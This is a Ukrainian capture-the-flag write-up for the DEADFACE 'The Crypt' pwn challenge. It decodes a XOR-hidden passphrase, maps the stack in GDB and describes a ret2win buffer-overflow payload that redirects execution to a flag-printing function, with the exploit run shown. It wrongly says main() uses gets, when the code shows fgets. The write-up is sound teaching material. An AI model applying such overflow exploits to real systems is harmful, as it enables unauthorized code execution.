# PWN / The Crypt

**Прапор:** `deadface{d3crypt3d_1nt0_n0th1ng}`

**Файли завдання:** архів з бінарником *(513 МБ)*

**Посилання на завантаженян архіву:** [The_Crypt.zip](https://deadface.sfo3.cdn.digitaloceanspaces.com/2026/challenges/pwn/The_Crypt.zip)

---

### Аналіз checksec
```sh
$ checksec The_Crypt 
[*] '/home/kali/deadface2026/The Crypt/The_Crypt'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
Виявлено:
* Canary ***вимкнено***
* NX (No-Execute) ***ввімкнено***
* PIE (Position Independent Executable) ***вимкнено***

---

### Аналіз у декомпіляторі IDA
* #### Функція main():
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s2[64];
  char s[64];
  
  ...
  
  printf("\n\n[!] How will you get inside? (Secret Code Required): ");
  if ( !fgets(s, 64, stdin) )
      return 0;
    s[strcspn(s, "\n")] = 0;
    de_crypt(s2);
    if ( !strcmp(s, s2) )
    {
      putchar(10);
      slowtype("...But you were already headed there, weren't you?\n\n\n");
      whispering_madness();
    }
    else
    {
      puts("Only Silence.");
    }
    return 0;
}
```
Програма просить користувача ввести Secret Code через метод gets, який є вразливим до Buffer Overflow. Далі ввід користувача звіряєть с дешифрованим еталоном. Дешифрований Secret Code зберігається в локальній змінній, що є серйозною вразливістю. Його можна дізнатися за допомогою динамічного аналізу, якщо невийде зареверсити алгоритм дешифрування.
* #### Функція de_crypt():
```c
_BYTE *__fastcall de_crypt(__int64 a1)
{
  _BYTE *result;
  int i;
  
  for ( i = 0; nothing_at_all[i]; ++i )
    *(_BYTE *)(i + a1) = nothing_at_all[i] ^ 0x13;
  result = (_BYTE *)(i + a1);
  *result = 0;
  return result;
}
```
Еталон лежить в секції .data `nothing_at_all = '\cv}LG{vLW||aLG|L]|d{vav'`. Шифрування відбувається за допомогою XOR з ключем 0х13. З цього вже можна зрозуміти, що Secret Code: **`Open_The_Door_To_Nowhere`**
* #### Функція slowtype(): просто виводить наданий текст повільно
* #### Функція whispering_madness():
```c
__int64 whispering_madness()
{
  _BYTE v1[64];
  puts("Darkness begins to surround you, and frantic, angry whispers coalesce in your mind:");
  printf("\n [!] \"WHO DARES ATTEMPT TO ENTER THE FORGOTTEN REALM?!\":");
  return gets(v1);
}
```
Чекає на переповнення буферу, але як змінювати стек?

Під час аналізу, була знайдена функція ***nowhere()***, яка ніде не викликається і просто виводить текст файлу *flag.txt*, тобто наш прапор.

---

### Аналіз за допомогою GDB

```sh
$ gdb The_Crypt
...
(gdb) b whispering_madness
Breakpoint 1 at 0x4016ce
(gdb) p nowhere 
$1 = {<text variable, no debug info>} 0x401660 <nowhere>
(gdb) r
...
[!] How will you get inside? (Secret Code Required): (вводимо пароль)

Breakpoint 1, 0x00000000004016ce in whispering_madness ()                                                                                                                   
(gdb) x/2gx $rbp
0x7fffffffdc50: 0x00007fffffffdce0      0x0000000000401855
(gdb) x/10gx $rbp-0x40
0x7fffffffdc10: 0x0000000000000000      0x00000000038444c0
0x7fffffffdc20: 0x00007fffffffdc50      0x00000000004015e3
0x7fffffffdc30: 0x00007fffffffdc50      0x0000000000403505
0x7fffffffdc40: 0x0000000000000000      0x000000000000003b
0x7fffffffdc50: 0x00007fffffffdce0      0x0000000000401855
```
Перші 4 рядки є буфером *(64 байти)*, а в 5-му рядку спочатку значення **вказівника кадру (RBP)** і потім адреса повернення в функцію **main**. Її ж і треба змінити на адресу **nowhere** - 0x401660.

---

#### ***Додатковий спосіб як знайти Secret Code:***
Аналізуємо дизасемблювання функції main. Знаходимо виклик функції *<de_crypt>* та ставимо брейкпойнт на наступну інструкцію. Візьмемо до уваги, яка адреса лежить у регістрі RDI: **RBP-0x80**, отже саме тут на стеку зберігається вивід функції *<de_crypt>*. Це на 64 байти вище за буфер ввдееня.
```sh
...
(gdb) disas main
  ...
  0x000000000040180f <+271>:   lea    -0x80(%rbp),%rax
  0x0000000000401813 <+275>:   mov    %rax,%rdi
  0x0000000000401816 <+278>:   call   0x4015fe <de_crypt>
  0x000000000040181b <+283>:   lea    -0x80(%rbp),%rdx
  ...
(gdb) b *0x000000000040181b
Breakpoint 1 at 0x40181b
(gdb) r
...
[!] How will you get inside? (Secret Code Required): ggggggggg

Breakpoint 1, 0x000000000040181b in main ()                                                                                                                                 
(gdb) x/10gx $rbp-0x80
0x7fffffffdc60: 0x6568545f6e65704f      0x6f545f726f6f445f
0x7fffffffdc70: 0x65726568776f4e5f      0x0000000000000000
0x7fffffffdc80: 0x0000000000000000      0x0000000000000000
0x7fffffffdc90: 0x0000000000000000      0x0000000000000000
0x7fffffffdca0: 0x6767676767676767      0x0000000000000067
(gdb) x/24c $rbp-0x80
0x7fffffffdc60: 79 'O'  112 'p' 101 'e' 110 'n' 95 '_'  84 'T'  104 'h' 101 'e'
0x7fffffffdc68: 95 '_'  68 'D'  111 'o' 111 'o' 114 'r' 95 '_'  84 'T'  111 'o'
0x7fffffffdc70: 95 '_'  78 'N'  111 'o' 119 'w' 104 'h' 101 'e' 114 'r' 101 'e'
```
Отримано саме те, що потрібно.

---

### Створення експлойту

Маємо звичайний Ret2win через Buffer Overflow.

Наш payload має складатись з: ***offset (64 + 8 bytes) -> nowhere address***

Запускаємо експлойт і отримуємо прапор:
```sh
$ python exploit.py
[+] Opening connection to 159.65.228.107 on port 5001: Done
[*] Switching to interactive mode
deadface{d3crypt3d_1nt0_n0th1ng}
[*] Got EOF while reading in interactive
$ 
```
